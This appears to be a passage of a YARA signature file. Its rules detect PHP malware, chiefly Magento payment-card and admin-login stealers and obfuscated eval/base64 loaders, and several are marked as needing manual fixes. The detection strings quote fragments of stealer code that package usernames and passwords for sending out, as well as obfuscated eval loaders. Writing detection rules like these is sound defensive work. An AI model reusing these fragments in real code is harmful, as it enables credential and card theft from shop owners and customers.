}

private rule PR05250 : trigger
{
    strings:
        $ps0 = "base64_encode(json_encode($_REQUEST));"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_181 : malware
{
    strings:
        $trigger = "$url = $url.\"?pop="
    condition:
        $trigger and PR00507 and PR05249 and PR05250
}

private rule PR05251 : trigger
{
    strings:
        $ps0 = "){Tools::redirectErrorPage();}"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_181_02 : malware
{
    strings:
        $trigger = "if(Tools::getValue('pop')=="
    condition:
        $trigger and PR05251
}

private rule PR05252 : trigger
{
    strings:
        $ps0 = "$message.= \"Client IP : \".$_SERVER['REMOTE_ADDR'].\"\\n\";"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_001 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05252 and PR00301 and PR02597
}

// MANUAL FIX NECESSARY
rule php_malware_magentologinstealer_002 : malware
{
    strings:
        $trigger = "mail("
        $php_malware_magentologinstealer_002_r0 = /mail\([^,]+,[\s]*.[aA][dD][mM][iI][nN] [fF][rR][oO][mM][\s]*.\.[\s]*\$_SERVER\[.HTTP_HOST.\],[\s]*.[lL][oO][gG][iI][nN][\s]*:/
    condition:
        $trigger and PR04056 and $php_malware_magentologinstealer_002_r0
}

private rule PR05253 : trigger
{
    strings:
        $ps0 = "/cc_"
    condition:
        $ps0
}

private rule PR05254 : trigger
{
    strings:
        $ps0 = "$clientip\\nUser Agent : $useragent\\n======"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_003 : malware
{
    strings:
        $trigger = "txt\",\"a\");"
    condition:
        $trigger and PR05253 and PR04056 and PR05254
}

private rule PR05255 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_HOST'].\"=\".base64_encode(json_encode(array($username,$password,$user->getEmail(),Mage::helper"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_004 : malware
{
    strings:
        $trigger = "Mage_Admin"
    condition:
        $trigger and PR05255 and PR04056
}

private rule PR05256 : trigger
{
    strings:
        $ps0 = "getenv(\"REMOTE_ADDR"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_005 : malware
{
    strings:
        $trigger = "json_decode(file_get_contents("
    condition:
        $trigger and PR04056 and PR05256
}

private rule PR05257 : trigger
{
    strings:
        $ps0 = "substr($send"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_005_02 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR00301 and PR05145 and PR05257
}

private rule PR05258 : trigger
{
    strings:
        $ps0 = "?email=$username&pass=$password"
    condition:
        $ps0
}

private rule PR05259 : trigger
{
    strings:
        $ps0 = "$username.\"|\".$password"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_006 : malware
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR05258 and PR05259 and PR03964
}

private rule PR05260 : trigger
{
    strings:
        $ps0 = ".$passwor"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_007 : malware
{
    strings:
        $trigger = "$geo = unserialize(file_get_contents"
    condition:
        $trigger and PR05260 and PR04056 and PR00301
}

private rule PR05261 : trigger
{
    strings:
        $ps0 = ",\"Admin Login Boss\""
    condition:
        $ps0
}

rule php_malware_magentologinstealer_007_02 : malware
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05260 and PR04056 and PR05261
}

private rule PR05262 : trigger
{
    strings:
        $ps0 = "$db($key,\""
    condition:
        $ps0
}

rule php_malware_magentologinstealer_008 : malware
{
    strings:
        $trigger = "class Mage_"
    condition:
        $trigger and PR05262
}

private rule PR05263 : trigger
{
    strings:
        $ps0 = "); } } foreach ($_POST as"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_009 : malware
{
    strings:
        $trigger = "\"admin_user\"))) { die"
    condition:
        $trigger and PR05263
}

private rule PR05264 : trigger
{
    strings:
        $ps0 = "$_POST['login']['password'];"
    condition:
        $ps0
}

private rule PR05265 : trigger
{
    strings:
        $ps0 = "curl_close($myCurl);"
    condition:
        $ps0
}

private rule PR05266 : trigger
{
    strings:
        $ps0 = "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"
    condition:
        $ps0
}

private rule PR05267 : trigger
{
    strings:
        $ps0 = "(isset($_POST['login"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_011 : malware
{
    strings:
        $trigger = "http_build_query($data)"
    condition:
        $trigger and PR05264 and PR05265 and PR05266 and PR00341 and PR05267 and PR00342
}

rule php_malware_magentologinstealer_012 : malware
{
    strings:
        $trigger = "$postLogin['password'].\"\\n\";"
    condition:
        $trigger and PR05232
}

private rule PR05268 : trigger
{
    strings:
        $ps0 = "Mage::getModel(\"admin/roles\")"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_013 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05268 and PR05086
}

private rule PR05269 : trigger
{
    strings:
        $ps0 = "\"&password=\""
    condition:
        $ps0
}

private rule PR05270 : trigger
{
    strings:
        $ps0 = "curl_init(\"http"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_015 : malware
{
    strings:
        $trigger = "/gate/check?\""
    condition:
        $trigger and PR05269 and PR05270
}

private rule PR05271 : trigger
{
    strings:
        $ps0 = "\"data\" => urlencode(base64_encode(http_build_query($_POST))),"
    condition:
        $ps0
}

private rule PR05272 : trigger
{
    strings:
        $ps0 = "time().'-'.rand(1111111,9999999999);"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_016 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05271 and PR00355 and PR05272 and PR00357
}

private rule PR05273 : trigger
{
    strings:
        $ps0 = "$auth_url = base64_encode"
    condition:
        $ps0
}

private rule PR05274 : trigger
{
    strings:
        $ps0 = "public function getAuthenticates($request)"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_017 : malware
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR05273 and PR05274
}

private rule PR05275 : trigger
{
    strings:
        $ps0 = "$this->getAuthenticates($authParam);"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_017_02 : malware
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR05274 and PR05275
}

rule php_malware_magentologinstealer_017_03 : malware
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR05274 and PR05178
}

rule php_malware_magentologinstealer_018 : malware
{
    strings:
        $trigger = "urlencode($password),false,stream_context_create(array('http"
    condition:
        $trigger and PR04504 and PR01431
}

private rule PR05276 : trigger
{
    strings:
        $ps0 = "},CURLOPT_RETURNTRANSFER,true);curl_exec(${$"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_019 : malware
{
    strings:
        $trigger = ".urlencode(${${\""
    condition:
        $trigger and PR05112 and PR05059 and PR05276
}

private rule PR05277 : trigger
{
    strings:
        $ps0 = "))!==false){if(!isset($_COOKIE[base64_decode("
    condition:
        $ps0
}

rule php_malware_magentologinstealer_020 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02155 and PR05277
}

private rule PR05278 : trigger
{
    strings:
        $ps0 = "\"Customer Login From :"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_021 : malware
{
    strings:
        $trigger = "$subject, $message, $headers);"
    condition:
        $trigger and PR00301 and PR05278
}

private rule PR05279 : trigger
{
    strings:
        $ps0 = "Tools::file_get_contents(\"https://\"."
    condition:
        $ps0
}

rule php_malware_magentologinstealer_022 : malware
{
    strings:
        $trigger = "if(isset($passwd)){"
    condition:
        $trigger and PR05279
}

private rule PR05280 : trigger
{
    strings:
        $ps0 = "if ($plaintextPassword!=null){"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_022_02 : malware
{
    strings:
        $trigger = "Tools::file_get_contents(\"https://\"."
    condition:
        $trigger and PR05280
}

private rule PR05281 : trigger
{
    strings:
        $ps0 = "\"reset\",$data_key);"
    condition:
        $ps0
}

rule php_malware_magentologinstealer_023 : malware
{
    strings:
        $trigger = "$patterns = preg_replace_callback(\"/^(?:.*?)$/\",\"reset\""
    condition:
        $trigger and PR05281 and PR00029
}

rule php_malware_magentologinstealer_023_02 : malware
{
    strings:
        $trigger = "$patterns = preg_replace_callback(\"/^(?:.*?)$/\",\"reset\""
    condition:
        $trigger and PR00029 and PR05275
}

rule php_malware_mx_start_injector_001 : malware
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR04405 and PR00029
}

rule php_malware_nicook_001 : malware
{
    strings:
        $trigger = "setcookie(\"nicook\", $myserver"
    condition:
        $trigger and PR00391
}

private rule PR05282 : trigger
{
    strings:
        $ps0 = "}=base64_decode(base64_decode("
    condition:
        $ps0
}

rule php_malware_obfuscated_002_02 : malware
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR03278 and PR05282
}

private rule PR05283 : trigger
{
    strings:
        $ps0 = "('',eval($"
    condition:
        $ps0
}

rule php_malware_obfuscated_009 : malware
{
    strings:
        $trigger = "t13';"
    condition:
        $trigger and PR03442 and PR05283
}

private rule PR05284 : trigger
{
    strings:
        $ps0 = ").chr("
    condition:
        $ps0
}

private rule PR05285 : trigger
{
    strings:
        $ps0 = "\")}(${"
    condition:
        $ps0
}

private rule PR05286 : trigger
{
    strings:
        $ps0 = ")]), chr(ord(\""
    condition:
        $ps0
}

rule php_malware_obfuscated_010 : malware
{
    strings:
        $trigger = "if (empty(${"
    condition:
        $trigger and PR05284 and PR01799 and PR05285 and PR05286
}

private rule PR05287 : trigger
{
    strings:
        $ps0 = "=@$_COOKIE;"
    condition:
        $ps0
}

private rule PR05288 : trigger
{
    strings:
        $ps0 = "'^'"
    condition:
        $ps0
}

private rule PR05289 : trigger
{
    strings:
        $ps0 = ">>"
    condition:
        $ps0
}

private rule PR05290 : trigger
{
    strings:
        $ps0 = ";if($"
    condition:
        $ps0
}

private rule PR05291 : trigger
{
    strings:
        $ps0 = "##"
    condition:
        $ps0
}

private rule PR05292 : trigger
{
    strings:
        $ps0 = "=0;"
    condition:
        $ps0
}

private rule PR05293 : trigger
{
    strings:
        $ps0 = "^$"
    condition:
        $ps0
}

rule php_malware_obfuscated_011 : malware
{
    strings:
        $trigger = "<<"
    condition:
        $trigger and PR05287 and PR05288 and PR05289 and PR05290 and PR05291 and PR05292 and PR05293
}

private rule PR05294 : trigger
{
    strings:
        $ps0 = "?>"
    condition:
        $ps0
}

private rule PR05295 : trigger
{
    strings:
        $ps0 = "} . $"
    condition:
        $ps0
}

private rule PR05296 : trigger
{
    strings:
        $ps0 = "( array($"
    condition:
        $ps0
}

private rule PR05297 : trigger
{
    strings:
        $ps0 = "}, \"\\n\"), \"\", \""
    condition:
        $ps0
}

private rule PR05298 : trigger
{
    strings:
        $ps0 = "};"
    condition:
        $ps0
}

private rule PR05299 : trigger
{
    strings:
        $ps0 = "( \"\", $"
    condition:
        $ps0
}

rule php_malware_obfuscated_012 : malware
{
    strings:
        $trigger = ") );"
    condition:
        $trigger and PR05294 and PR05295 and PR05296 and PR01692 and PR05297 and PR05298 and PR05299
}

private rule PR05300 : trigger
{
    strings:
        $ps0 = "include(\"temp"
    condition:
        $ps0
}

rule php_malware_obfuscated_013 : malware
{
    strings:
        $trigger = "=str_replace(\"[t1]\", \"<?"
    condition:
        $trigger and PR05300
}

private rule PR05301 : trigger
{
    strings:
        $ps0 = "';/*"
    condition:
        $ps0
}

private rule PR05302 : trigger
{
    strings:
        $ps0 = "),'');"
    condition:
        $ps0
}

private rule PR05303 : trigger
{
    strings:
        $ps0 = "($_SERVER[$"
    condition:
        $ps0
}

private rule PR05304 : trigger
{
    strings:
        $ps0 = "\"\\137\\162\\145\\160\\154\\141\\143\\145\";"
    condition:
        $ps0
}

private rule PR05305 : trigger
{
    strings:
        $ps0 = "'/e';"
    condition:
        $ps0
}

rule php_malware_obfuscated_014 : malware
{
    strings:
        $trigger = "'/.*';"
    condition:
        $trigger and PR05301 and PR05302 and PR05303 and PR05304 and PR05305
}

private rule PR05306 : trigger
{
    strings:
        $ps0 = "){if(!self::$_j):self::_ulerv();endif;return hex2bin(self::$_j[$_"
    condition:
        $ps0
}

rule php_malware_obfuscated_015 : malware
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01678 and PR05306
}

private rule PR05307 : trigger
{
    strings:
        $ps0 = "[$i]]) ? $"
    condition:
        $ps0
}

private rule PR05308 : trigger
{
    strings:
        $ps0 = "'1'=>'"
    condition:
        $ps0
}

rule php_malware_obfuscated_016 : malware
{
    strings:
        $trigger = "eval/*"
    condition:
        $trigger and PR05307 and PR05308
}

private rule PR05309 : trigger
{
    strings:
        $ps0 = "rawurl%22%20.%20%22decode%22%3Bretur"
    condition:
        $ps0
}

rule php_malware_obfuscated_016_02 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR05309
}

private rule PR05310 : trigger
{
    strings:
        $ps0 = "#/\\*\\*SSL_START(.*)SSL_END\\*\\*/#s"
    condition:
        $ps0
}

rule php_malware_obfuscated_017 : malware
{
    strings:
        $trigger = "(__FILE__),$match);$key=$match[1];"
    condition:
        $trigger and PR05310
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_018 : malware
{
    strings:
        $trigger = "eva"
        $php_malware_obfuscated_018_r0 = /';eval\(\$[^a-zA-Z0-9]+\(\$[^a-zA-Z0-9]+\)\);/
    condition:
        $trigger and $php_malware_obfuscated_018_r0
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_020 : malware
{
    strings:
        $trigger = "base64_decode"
        $php_malware_obfuscated_020_r0 = /<\?php[\s]*\$[0O]{3,}[\s]*=[\s]*base64_decode\(.[\w]{30,}.\);[\s]*\$[0O]+[\s]*=[\s]*\$[0O]+\{[\d]+\}[\s]*\.[\s]*\$[0O]+\{[\d][^\(]+eval\([\s]*\$[0O]/
    condition:
        $trigger and PR00029 and $php_malware_obfuscated_020_r0
}

rule php_malware_obfuscated_022_02 : malware
{
    strings:
        $trigger = "=create_function(null,gzinflate(convert_uudecode(\""
    condition:
        $trigger
}

private rule PR05311 : trigger
{
    strings:
        $ps0 = "(__FILE__,false,null,__COMPILER_HALT_OFFSET__"
    condition:
        $ps0
}

private rule PR05312 : trigger
{
    strings:
        $ps0 = "=range(\"\\0\",\"\\xff\");"
    condition:
        $ps0
}

rule php_malware_obfuscated_023 : malware
{
    strings:
        $trigger = "\");__halt_compiler();"
    condition:
        $trigger and PR05311 and PR01590 and PR05312
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_024 : malware
{
    strings:
        $trigger = "].$"
        $php_malware_obfuscated_024_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_malware_obfuscated_024_r1 = /'';[\s]*\$[\w]+\(\$[\w]+,[\s]*\$[\w]+[\s]*\.[\s]*\"[\w]{1000}[^\"]+\"[\s]*\.[\s]*\$[\w]+[\s]*\.[\s]*\$[\w]+\);/
    condition:
        $trigger and $php_malware_obfuscated_024_r0 and $php_malware_obfuscated_024_r1
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_025 : malware
{
    strings:
        $trigger = "));$"
        $php_malware_obfuscated_025_r0 = /if\(!function_exists\(\"[\w]+\"\)\)[\s]*\{[\s]*function [\w]+\(\$[\w]+\)\{\$[\w]+[\s]*=[\s]*array[^\}]+\}[\s]*return[\s]*\$[\w]+\[[\d]+\];\}[\s]*\$[\w]+[\s]*=[\s]*\"[^}]{5000}/
    condition:
        $trigger and PR01653 and PR01335 and $php_malware_obfuscated_025_r0
}

private rule PR05313 : trigger
{
    strings:
        $ps0 = "#!/usr/bin/php -q"
    condition:
        $ps0
}

private rule PR05314 : trigger
{
    strings:
        $ps0 = "@error_reporting(0);@ini_set('display_errors',false);defined("
    condition:
        $ps0
}

rule php_malware_obfuscated_026 : malware
{
    strings:
        $trigger = "return(eval($"
    condition:
        $trigger and PR05313 and PR01422 and PR05314
}

// MANUAL FIX NECESSARY
private rule PR05315 : trigger
{
    strings:
        $ps0 = "<<"
    condition:
        $ps0
}

rule php_malware_obfuscated_027 : malware
{
    strings:
        $trigger = "'^'"
        $php_malware_obfuscated_027_r0 = /\^['\"]/
        $php_malware_obfuscated_027_r1 = /;[\s]*[\w]+;/
        $php_malware_obfuscated_027_r2 = /'\^'[^;]+';[\s]*\$[\w]+[\s]*=[\s]*'[^\x02]+;[\w]+;[^\x02]+\/\*/
    condition:
        $trigger and PR05315 and PR02609 and $php_malware_obfuscated_027_r0 and $php_malware_obfuscated_027_r1 and $php_malware_obfuscated_027_r2
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_028 : malware
{
    strings:
        $trigger = "; goto"
        $php_malware_obfuscated_028_r0 = /<\?(php)?[\s]*(\/\*[^\$]+\*\/[\s]*)?goto [\w]+;[\s]*[\w]+:[^\n]+([\s]*\?>)?/
    condition:
        $trigger and $php_malware_obfuscated_028_r0
}

rule php_malware_obfuscated_029 : malware
{
    strings:
        $trigger = "GvRubpXzq9vrRKGAUY8pxfP3ZYV/HJrOxLCjzy5hLPpoGxrla"
    condition:
        $trigger and PR01398
}

private rule PR05316 : trigger
{
    strings:
        $ps0 = "ijrzxTfYDqdC1SuqhfYZjJtYS1Pz1R1AVySuFrAU+mZE3KVqt"
    condition:
        $ps0
}

rule php_malware_obfuscated_029_02 : malware
{
    strings:
        $trigger = "eval(base64_decode"
    condition:
        $trigger and PR05316
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_030 : malware
{
    strings:
        $trigger = "equire"
        $php_malware_obfuscated_030_r0 = /(\$[\w]+[\s]*=[^;]+;[\s]*){5,}\$[\w]+\(\$[\w]+,[\s]*\$[\w]+\((\$[\w]+[\s]*\.[\s]*){3,}\$[\w]+\)\);[\s]*require[\s]*\$[\w]+;/
    condition:
        $trigger and $php_malware_obfuscated_030_r0
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_031 : malware
{
    strings:
        $trigger = "^"
        $php_malware_obfuscated_031_r0 = /\$[\w]+=[^\n]+'\.([\s]+'[^\n]+'\.\n)+[\s]+'[^\n]+';[\s]*\Z/
    condition:
        $trigger and PR02609 and $php_malware_obfuscated_031_r0
}

rule php_malware_obfuscated_032 : malware
{
    strings:
        $trigger = "file(__FILE__);eval(base64_decode(getmal("
    condition:
        $trigger
}

rule php_malware_obfuscated_033 : malware
{
    strings:
        $trigger = ",PREG_SPLIT_NO_EMPTY);foreach($c as $d=>$e){$c[$d]=${"
    condition:
        $trigger and PR01984
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_034 : malware
{
    strings:
        $trigger = "].$"
        $php_malware_obfuscated_034_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_malware_obfuscated_034_r1 = /\$[\w]+[\s]*=[\"][^\"]+\";[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\[[\d]+\][\s]*(\.[\s]*\$[\w]+\[[\d]+\][\s]*){10,}[^\n]+\)\)\);[\s]*\$[\w]+\(\);/
    condition:
        $trigger and $php_malware_obfuscated_034_r0 and $php_malware_obfuscated_034_r1
}

private rule PR05317 : trigger
{
    strings:
        $ps0 = "},$GLOBALS{"
    condition:
        $ps0
}

rule php_malware_obfuscated_035 : malware
{
    strings:
        $trigger = "],$GLOBALS{"
    condition:
        $trigger and PR01493 and PR05317 and PR04915 and PR04916
}

private rule PR05318 : trigger
{
    strings:
        $ps0 = "}[\"key\"])){$"
    condition:
        $ps0
}

private rule PR05319 : trigger
{
    strings:
        $ps0 = "};unset\\x28\\x24"
    condition:
        $ps0
}

rule php_malware_obfuscated_036 : malware
{
    strings:
        $trigger = "onsubmit=\\\"document.cookie='key='+encodeURIComponent(this[0].value)"
    condition:
        $trigger and PR05318 and PR05319
}

private rule PR05320 : trigger
{
    strings:
        $ps0 = "(str_replace(\"\\n\", '', '"
    condition:
        $ps0
}

private rule PR05321 : trigger
{
    strings:
        $ps0 = ").sha1(strrev($"
    condition:
        $ps0
}

private rule PR05322 : trigger
{
    strings:
        $ps0 = ")).substr(md5($"
    condition:
        $ps0
}

private rule PR05323 : trigger
{
    strings:
        $ps0 = "]:(isset($_COOKIE["
    condition:
        $ps0
}

rule php_malware_obfuscated_037 : malware
{
    strings:
        $trigger = "gzinflate"
    condition:
        $trigger and PR05320 and PR05321 and PR05322 and PR05323
}

rule php_malware_obfuscated_038 : malware
{
    strings:
        $trigger = ");$php=@base64_decode($b64);if($php){eval($php);}else{unlink(__FILE__);}}"
    condition:
        $trigger and PR01431
}

private rule PR05324 : trigger
{
    strings:
        $ps0 = ": echo \""
    condition:
        $ps0
}

private rule PR05325 : trigger
{
    strings:
        $ps0 = ": if (!(md5($_GET[\""
    condition:
        $ps0
}

private rule PR05326 : trigger
{
    strings:
        $ps0 = ": set_time_limit(0); goto"
    condition:
        $ps0
}

rule php_malware_obfuscated_039 : malware
{
    strings:
        $trigger = ": error_reporting(0); goto"
    condition:
        $trigger and PR05324 and PR05325 and PR01746 and PR05326
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_041 : malware
{
    strings:
        $trigger = "\\x"
        $php_malware_obfuscated_041_r0 = /<\?php eval\(str_rot13\(gzinflate\(base64_decode\(\"[^;]+\\x[^;]+\);/
    condition:
        $trigger and PR00029 and $php_malware_obfuscated_041_r0
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_042 : malware
{
    strings:
        $trigger = "\\x"
        $php_malware_obfuscated_042_r0 = /@eval\(\$[O0]+\[.[\w]+.\]\(\$[O0]+\[.[\w]+.\]\([^;]{1000,}/
    condition:
        $trigger and PR00029 and $php_malware_obfuscated_042_r0
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_043 : malware
{
    strings:
        $trigger = "\\x7"
        $php_malware_obfuscated_043_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*['\"][^;]{1000,};[\s]*\$[\w]+[\s]*=[\s]['\"][preglac_'\"\s\.]{15,};/
    condition:
        $trigger and $php_malware_obfuscated_043_r0
}

private rule PR05327 : trigger
{
    strings:
        $ps0 = ":(isset($_COOKIE["
    condition:
        $ps0
}

private rule PR05328 : trigger
{
    strings:
        $ps0 = "3';error_reporting(0);$"
    condition:
        $ps0
}

rule php_malware_obfuscated_044 : malware
{
    strings:
        $trigger = "strrev"
    condition:
        $trigger and PR00732 and PR05327 and PR05328
}

rule php_malware_obfuscated_046 : malware
{
    strings:
        $trigger = "<?php eval(pack('H*','2"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_047 : malware
{
    strings:
        $trigger = "0O"
        $php_malware_obfuscated_047_r0 = /\$[0O]+[\s]*=[\s]*base64_decode\([^;]+\);[\s]*\$[0O]+[\s]*\.?=[\s]*\$[0O]+(\{|\[[\d]+\]|\})[^\(]+eval\(\$[0O]+\(.{500,}\)\);/
    condition:
        $trigger and PR00029 and PR01422 and $php_malware_obfuscated_047_r0
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_048 : malware
{
    strings:
        $trigger = "].$"
        $php_malware_obfuscated_048_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_malware_obfuscated_048_r1 = /function[\s]*[\w]+\(\$[\w]+\)[\s]*\{[\s]*GLOBAL[\s]*\$[\w]+,[\s]*\$[\w]+;[\s]*\$[\w]+[\s]*=[\s]*get_option\(.[\w]+.\);[\s]*if\(isset\(\$[\w]+\[.[\w]+.\]\)\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*explode\(.#.,[\s]*hex2bin\(\$/
    condition:
        $trigger and $php_malware_obfuscated_048_r0 and $php_malware_obfuscated_048_r1
}

private rule PR05329 : trigger
{
    strings:
        $ps0 = ")) { continue; } $"
    condition:
        $ps0
}

private rule PR05330 : trigger
{
    strings:
        $ps0 = "(get_defined_vars()));"
    condition:
        $ps0
}

private rule PR05331 : trigger
{
    strings:
        $ps0 = "foreach (array(@$"
    condition:
        $ps0
}

rule php_malware_obfuscated_049 : malware
{
    strings:
        $trigger = ".= '_' . $"
    condition:
        $trigger and PR05329 and PR05330 and PR00265 and PR05331
}

rule php_malware_obfuscated_050 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FZvHkoPKskU/554TDPAuXtwBAuG9h8kNPA"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_051 : malware
{
    strings:
        $trigger = "].$"
        $php_malware_obfuscated_051_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_malware_obfuscated_051_r1 = /\$[\w]+[\s]*=[\s]*\"[^\"]{30,}\";[\s]*(\$[\w]+[\s]*=[\s]*\$[\w]+\[[\d]+\][^;]*;[\s]*){3,}@\$[\w]+\(\$[\w]+\([^;]+\);/
    condition:
        $trigger and $php_malware_obfuscated_051_r0 and $php_malware_obfuscated_051_r1
}

private rule PR05332 : trigger
{
    strings:
        $ps0 = "<?php $Pass"
    condition:
        $ps0
}

rule php_malware_obfuscated_052 : malware
{
    strings:
        $trigger = "file(__FILE__);eval(base64_decode("
    condition:
        $trigger and PR05332
}

private rule PR05333 : trigger
{
    strings:
        $ps0 = "\\x73\\x74\\x72\\x6c\\x65\\x6e\"($"
    condition:
        $ps0
}

private rule PR05334 : trigger
{
    strings:
        $ps0 = "\\x68\\x65\\x78\\x64\\x65\\x63"
    condition:
        $ps0
}

rule php_malware_obfuscated_053 : malware
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR01362 and PR05333 and PR05334
}

private rule PR05335 : trigger
{
    strings:
        $ps0 = "$password=$_GET{"
    condition:
        $ps0
}

private rule PR05336 : trigger
{
    strings:
        $ps0 = "}{0x00295},$_GET{"
    condition:
        $ps0
}

rule php_malware_obfuscated_054 : malware
{
    strings:
        $trigger = "ror_reporting"
    condition:
        $trigger and PR04915 and PR05335 and PR05336
}

private rule PR05337 : trigger
{
    strings:
        $ps0 = "while($GLOBALS[pack($GLOBALS["
    condition:
        $ps0
}

private rule PR05338 : trigger
{
    strings:
        $ps0 = "))get_contents($file,true);"
    condition:
        $ps0
}

rule php_malware_obfuscated_056 : malware
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR05337 and PR01498 and PR05338
}

// MANUAL FIX NECESSARY
private rule PR05339 : trigger
{
    strings:
        $ps0 = "0x3f;$"
    condition:
        $ps0
}

rule php_malware_obfuscated_057 : malware
{
    strings:
        $trigger = "));$"
        $php_malware_obfuscated_057_r0 = /\)\);return[\s]*\$[\w]+;\}\}else\{function[\s]*[\w]+\(\$[\w]+\)\{global[\s]*\$[\w]+;return[\s]*\$[\w]+\(\$[\w]+\);\}\}\$/
    condition:
        $trigger and PR05339 and PR01498 and $php_malware_obfuscated_057_r0
}

private rule PR05340 : trigger
{
    strings:
        $ps0 = "});return get_defined_vars();}${"
    condition:
        $ps0
}

private rule PR05341 : trigger
{
    strings:
        $ps0 = "eval(\"?>\".base64_decode(stream_get_contents(${${"
    condition:
        $ps0
}

rule php_malware_obfuscated_058 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05340 and PR05341 and PR00355 and PR00357
}

private rule PR05342 : trigger
{
    strings:
        $ps0 = "oxMHfzRc7wvRuelc1SKDM1LjnZTLGYBdtUSojN9opJzEG44lre7VRPXxCCe2bbTVU"
    condition:
        $ps0
}

rule php_malware_obfuscated_059 : malware
{
    strings:
        $trigger = "file(__FILE__);eval(base64_decode("
    condition:
        $trigger and PR05342
}

rule php_malware_obfuscated_060 : malware
{
    strings:
        $trigger = "\\x28\\x61\\x72\\x72\\x61\\x79\\x28\\x27\\x23\\x73\\x21\\x73\\x23\\x27\\x2C\\x27\\x23\\x65\\x21\\x65\\x23\\x27\\x2C\\x27\\x23\\x30\\x21\\x30\\x23\\x27\\x2C\\x27\\x23\\x30\\x72\\x30\\x23\\x27\\x2C\\x27\\x23\\x30\\x6E\\x30\\x23\\x27\\x29\\x2C\\x61\\x72\\x72\\x61\\x79\\x28\\x27\\x3C\\x27\\x2C\\x27\\x3E\\x27\\x2C\\x22\\x5C\\x30\\x22\\x2C\\x22\\x5C\\x72\\x22\\x2C\\x22\\x5C\\x6E\\x22\\x29\\x2C\\x6F\\x62\\x5F\\x67\\x65\\x74\\x5F\\x63\\x6C\\x65\\x61\\x6E\\x28\\x29\\x29\\x3B\\x66\\x6F"
    condition:
        $trigger and PR00029
}

// MANUAL FIX NECESSARY
private rule PR05343 : trigger
{
    strings:
        $ps0 = ".='t13';"
    condition:
        $ps0
}

rule php_malware_obfuscated_061 : malware
{
    strings:
        $trigger = "='str'.'_'.'ro';"
        $php_malware_obfuscated_061_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*'str'\.'_'\.'ro';/
    condition:
        $trigger and PR05343 and $php_malware_obfuscated_061_r0
}

private rule PR05344 : trigger
{
    strings:
        $ps0 = "=NULL;@eval($"
    condition:
        $ps0
}

rule php_malware_obfuscated_062 : malware
{
    strings:
        $trigger = ")));unset($"
    condition:
        $trigger and PR05344 and PR00265 and PR01494
}

// MANUAL FIX NECESSARY
rule php_malware_obfuscated_063 : malware
{
    strings:
        $trigger = "((''),"
        $php_malware_obfuscated_063_r0 = /\$[\w]+[\s]*=[\s]*'[^']{40,}';[^\n]+@\$[\w]+\(\);/
    condition:
        $trigger and PR01017 and PR01692 and PR01016 and $php_malware_obfuscated_063_r0
}

// MANUAL FIX NECESSARY
